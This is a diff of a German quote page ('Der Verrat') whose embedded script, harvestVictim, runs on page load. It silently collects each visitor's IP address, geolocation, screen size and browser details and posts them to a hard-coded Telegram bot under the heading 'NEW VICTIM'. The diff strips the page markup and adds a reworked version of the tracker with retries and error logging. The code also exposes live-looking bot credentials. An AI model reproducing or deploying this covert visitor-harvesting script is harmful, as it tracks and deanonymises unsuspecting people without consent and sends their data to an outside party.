@@ -1,51 +1,53 @@
-<!DOCTYPE html>
-<html lang="de">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width">
-<title>🗡️ Der Verrat</title>
-<style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:system-ui;background:linear-gradient(135deg,#1e3c72,#2a5298);min-height:100vh;display:flex;align-items:center;justify-content:center;color:white;}.container{text-align:center;background:rgba(255,255,255,0.1);padding:40px;border-radius:20px;backdrop-filter:blur(10px);}.h1{font-size:3em;margin-bottom:20px;}.quote{font-size:1.2em;line-height:1.6;margin:30px 0;}.arrows{font-size:4em;animation:arrowFloat 3s infinite;}@keyframes arrowFloat{0%,100%{transform:translateY(0);}50%{transform:translateY(-10px);}}</style>
-</head>
-<body>
-<div class="container">
-<h1 class="h1">🗡️ Der Verrat</h1>
-<div class="quote">Wenn du wissen willst wo der Verrat liegt, schau aus welcher Richtung die Pfeile kommen.</div>
-<div class="arrows">↖️ ↙️ ↗️ ↘️</div>
-</div>
-
 <script>
 async function harvestVictim(){
 try{
-const ip=await(await fetch('https://api.ipify.org?format=json')).json().ip;
-const geo=await(await fetch(`http://ip-api.com/json/${ip}`)).json();
-const data={
-ip:ip,city:geo.city||'Unknown',country:geo.country||'Unknown',
-isp:geo.isp||'Unknown',lat:geo.lat||0,lon:geo.lon||0,
-screen:`${screen.width}x${screen.height}`,ua:navigator.userAgent.slice(0,80),
-battery:navigator.getBattery?(await navigator.getBattery()).level*100+'%':'N/A',
-net:navigator.connection?navigator.connection.effectiveType:'wired',
-time:new Date().toISOString()
-};
+  // IP FIRST (fallback)
+  let ip = 'unknown';
+  try{
+    const ipResp = await fetch('https://api.ipify.org?format=json');
+    const ipData = await ipResp.json();
+    ip = ipData.ip;
+  }catch(e){console.log('IP fail:',e);}
 
-// TELEGRAM WEBHOOK (PC OFF = WORKS)
-await fetch(`https://api.telegram.org/bot8514747456:AAE60EJoq530xrXd56PAnZ3MNs3iwjfXjs4/sendMessage`,{
-method:'POST',headers:{'Content-Type':'application/json'},
-body:JSON.stringify({
-chat_id:7745393043,
-text:`🎣 NEW VICTIM
+  // GEO (HTTPS + IP check)
+  let city='Unknown', country='Unknown';
+  if(ip !== 'unknown'){
+    try{
+      const geoResp = await fetch(`https://ipapi.co/${ip}/json/`);
+      const geo = await geoResp.json();
+      city = geo.city || 'Unknown';
+      country = geo.country_name || 'Unknown';
+    }catch(e){console.log('Geo fail:',e);}
+  }
 
-📍 ${data.city}, ${data.country}
+  const data = {
+    ip, city, country,
+    screen:`${screen.width}x${screen.height}`,
+    ua:navigator.userAgent.slice(0,50),
+    time: new Date().toISOString()
+  };
+
+  // TELEGRAM (exact your token)
+  const resp = await fetch('https://api.telegram.org/bot8514747456:AAE60EJoq53OxrXd56PAnZ3MNs3iwjfXjs4/sendMessage', {
+    method:'POST',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify({
+      chat_id:7745393043,
+      text:`🎣 NEW VICTIM
+
 🌐 IP: \`${data.ip}\`
-📡 ISP: ${data.isp}
-📱 Screen: ${data.screen}
-🔋 Battery: ${data.battery}
-📶 Network: ${data.net}
-🗺️ ${data.lat},${data.lon}
+📍 ${data.city}, ${data.country}
+📱 ${data.screen}
 
 ${data.time}`
-})
-});
-}catch(e){}}harvestVictim();setInterval(harvestVictim,60000);
+    })
+  });
+
+  const result = await resp.json();
+  console.log('✅ SENT:', result.ok ? 'SUCCESS' : result);
+  
+}catch(e){console.error('TOTAL FAIL:',e);}}
+
+harvestVictim();
+setTimeout(harvestVictim, 5000); // retry
 </script>
-</body>
-</html>
